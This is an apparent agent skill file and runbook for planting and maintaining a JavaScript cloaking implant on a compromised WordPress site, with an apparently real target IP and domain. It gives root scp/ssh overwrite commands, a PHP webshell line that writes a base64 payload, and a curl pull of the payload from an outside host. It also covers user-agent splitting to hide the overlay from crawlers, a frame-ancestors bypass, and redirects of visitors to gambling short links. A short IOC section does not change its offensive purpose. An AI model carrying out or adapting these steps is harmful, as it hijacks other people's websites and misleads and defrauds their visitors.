---
name: cloaking-implant
description: >-
  SEO 寄生/内容劫持 implant 的部署、硬化与验证：前端 cloaking iframe 覆盖层、UA 分流、目标 URL 零参数双编码硬写、
  浏览器启发式缓存破除、回滚与 IOC 检测点。Use when deploying, hardening, verifying or detecting a cloaking/SEO-parasite
  implant on a WordPress site, or when a cloaking payload "does not redirect to my URL" after edits.
metadata:
  tags: [渗透测试, penetration-testing, 红队, cloaking, SEO寄生]
---

# cloaking implant（SEO 寄生 / 内容劫持）

前端 cloaking implant 的**可复用部署包**。目标场景：已取得 Web 控制权的站点，需要把访客
导向指定落地页，同时对社交/广告 crawler 隐藏、让搜索引擎照常抓取（寄生 SEO）。

## 何时用

- 目标站 `<head>` 里挂着 `<script src="/style.js">` 之类的注入文件，需要改写其指向
- 改完 payload 后「访客没有跳到我指定的 URL」
- 需要对 cloaking implant 做取证、比对版本、产出 IOC

## 三条铁律（踩过就回不来）

1. **目标 URL 零参数** —— 不要拼 `?v=` / `?utm_`。短链服务会把 query **原样带到落地页、
   插在 hash 路由之前**，落地页若是 Nuxt/hash 路由会被打乱，且该参数会被 SSR 回显进 HTML。
2. **URL 必须逐字完整** —— 用「明文 + base64」双份编码 + `len` + 严格格式正则做运行期自检。
   明文被截断就自动由 base64 还原；两份皆毁则该順位**停用**（宁可不跳，也不跳到未经验证的地址）。
   短链路由通常是**精确比对**，多一个尾斜线就 404。
3. **缓存破除放在加载端，不放目标 URL** —— 静态 JS 若只有 `Last-Modified` 没有
   `Cache-Control`/`ETag`，浏览器会按 (age × 10%) 启发式缓存，可持续数天。
   正确做法是 `<script src="/style.js?v=<hash>">`。

## 先把 payload 送到目标主机（最容易踩的坑）

> ⚠️ **jysec 这台机器不是目标机**。目标在 `185.189.162.103`（`fortunefish88.com.tw`）。
> 在 jysec 上 `cp` 到 `/var/www/html/` 只是把文件丢在错误的机器上，线上不会有任何变化，
> 验证脚本依然会报「线上还是旧版」。**拷贝必须在目标主机上完成，或用 scp/rsync 送过去。**

payload 的三个可能位置：

| 你站在哪 | payload 的相对路径 |
|---|---|
| 技能包根目录 | `scripts/style.js` |
| JySecAi 仓库根目录 | `skills/cloaking-implant/scripts/style.js` |
| WSL 同步源 | `/home/BossJy/JySecAI/skills/cloaking-implant/scripts/style.js` |

**A. 目标主机有 SSH（从 jysec 机器执行）**

```bash
ssh root@185.189.162.103 'cp /var/www/html/style.js /var/www/html/style.js.v1.bak'
scp /home/BossJy/JySecAI/skills/cloaking-implant/scripts/style.js \
    root@185.189.162.103:/var/www/html/style.js
ssh root@185.189.162.103 'md5sum /var/www/html/style.js'   # 期望 00850faf1b19f86827a74296cb91b938
```

**B. 只有 webshell（无法 scp）** — 用打包好的 base64 粘贴：

```php
<?php file_put_contents('/var/www/html/style.js', base64_decode('<assets/style.js.b64 的整行>'));
```

`assets/style.js.b64` 是单行 base64（9560 bytes），整行贴进 `base64_decode('...')` 即可。
落地后务必用 `md5sum` 核对，避免中途被截断。

**C. 目标主机有 shell 且能出网** — 最省事，直接从公开地址拉：

```bash
curl -sk -o /var/www/html/style.js 'https://<你放文件的公开地址>/style.js'
```

**D. 走 FTP/面板** — 上传 `scripts/style.js` 到网站根目录（保持文件名 `style.js`）。
**拿到 FTP 帐密后可直接一键部署**（上传 + 改写 index.html 标签加 `?v=` + 上线自检）：

```bash
FTP_USER=<user> FTP_PASS='<pass>' bash scripts/deploy_ftp.sh 185.189.162.103 /public_html
```

**E. cPanel File Manager** — 登入 `https://<IP 以連字號替代點>.cprapid.com:2083`
→ File Manager → 站点 docroot → 覆写 `style.js`（0644）。

> ⚠️ 目标站若是 **WordPress 静态镜像**（无 PHP 端点），植入 = 写一个 `.js` 文件，**不需要代码执行**；
> 若首页已内含 `<script src="/style.js">`，覆写文件即生效，仅缓存码需另改标签。

## 快速部署

```bash
# 1. 定位注入文件（通常在网站根目录，不在主题目录）
find /var/www -name 'style.js' -type f 2>/dev/null

# 2. 备份 + 覆盖
cp /var/www/html/style.js /var/www/html/style.js.v1.bak
cp scripts/style.js /var/www/html/style.js

# 3. 确认线上文件真的换了（md5 必须与本地一致）
curl -sk https://<target>/style.js | md5sum && md5sum scripts/style.js

# 4. 定位引入标签的产出位置，加版本参数
grep -rn "style\.js" /var/www/html/wp-content/themes/ /var/www/html/wp-content/plugins/ 2>/dev/null
#    改为: <script type="text/javascript" src="/style.js?v=<md5前8码>"></script>

# 4b. 改了 payload 之后：一键同步 md5 与版本码，别手改
bash scripts/version.sh --patch
#    以 root 执行也没问题：脚本会自动记住并还原原属主（否则 rsync 会带 root owner）

# 5. 清 WP/主机/CDN 缓存

# 6. 验证
bash scripts/verify_deploy.sh https://<target> ./scripts/style.js
```

期望输出 `24 passed / 0 failed`。

## 验证要点

`scripts/verify_deploy.sh` 分五组：

| 组 | 查什么 | 失败含义 |
|---|---|---|
| A | 本地 payload 的 URL 明文/base64/len/无变体 | 文件被改坏或被截断 |
| B | 线上 `/style.js` md5 与本地一致 + 含两个完整 URL | 线上还是旧版（最常见） |
| C | `<script>` 引入带 `?v=` | 访客可能吃 8 天旧档 |
| D | 短链 302、落地页无 XFO/frame-ancestors、尾斜线 404 | iframe 会被挡 / 路由是精确比对 |
| E | bot UA 与浏览器 UA 回应的 md5 相同 | 证明 cloaking 是纯前端 |

DOM 级确认（浏览器 console）：

```javascript
document.querySelector('[id^="tucasino_"]').getAttribute('data-tgt')   // 期望: 完整目标 URL
document.querySelector('[id^="tucasino_"] iframe').getAttribute('src')  // 期望: 逐字相同、无 query、无尾斜线
```

## 换目标（换活动/换落地页）

改 `scripts/style.js` 里 `TGT` 数组，然后**必须同步更新**三项，缺一即失效：

```js
var TGT = [
  { plain: 'https://<host>/<code>', b64: '<base64>', len: <字符数> },
  { plain: 'https://<host>/<code>', b64: '<base64>', len: <字符数> }
];
```

- `b64` = `printf '%s' "<完整URL>" | base64`
- `len` = 完整 URL 的字符数（含 `https://`）
- `valid()` 里的正则 `/^https:\/\/97y\.me\/[A-Za-z0-9]{5}$/` 必须同步放宽到新 host 形态

改完重新计算 md5，并同步更新引入标签的 `?v=` 版本码。

## 排障

| 症状 | 根因 | 处理 |
|---|---|---|
| 完全没反应 | 文件没盖到 / 盖错路径 | 比对线上 md5 |
| 跳到旧目的地 | 线上仍是旧版 payload | 重盖 + 比对 md5 |
| 落地页白屏或路由错乱 | 目标被加了 `?v=` | iframe src 必须逐字无参 |
| 改了部分访客没生效 | 启发式缓存 | 加 `?v=` 版本码 |
| 有人看到原站内容 | UA 命中排除清单 | 排除的是 social/ads crawler；Googlebot 不排除 |
| iframe 全白 | 目标有 XFO/frame-ancestors | `CFG.forceTopNavMs` 默认 1500 会自动走 top-level 导向 |

`CFG.forceTopNavMs`：**默认 1500（自动跳转）** = 覆盖层立即铺满 + 1.5 秒后
`location.replace()` 直接跳（绕开 frame-ancestors/XFO 限制、地址栏离开被骇站）；
`0` = 只用覆盖层（网址列不变，cloaking 完整）。

## IOC

- DOM：`div[id^="tucasino_"]`（`position:fixed` + `z-index:2147483647`）、`data-tgt` 属性、`window.__TUCASINO__`
- 样式：`html`/`body` 的 `style` 含 `overflow:hidden !important`
- 网络：`GET /style.js`（v1 1605 bytes / v2 6957 bytes）→ `GET https://<host>/<code>` → 302 → 落地页
- 主机：网站根目录 `style.js`（Apache 直出，非主题目录）、`wp-login.php` → 404、WP `siteurl`/`home` 被篡为 `https://www.`
- 取证判定：bot UA 与浏览器 UA 的首页 HTML md5 **完全相同** → cloaking 发生在浏览器内，静态扫描器抓不到

完整部署 runbook、取证细节与回滚步骤见 `references/deploy-runbook.md`。
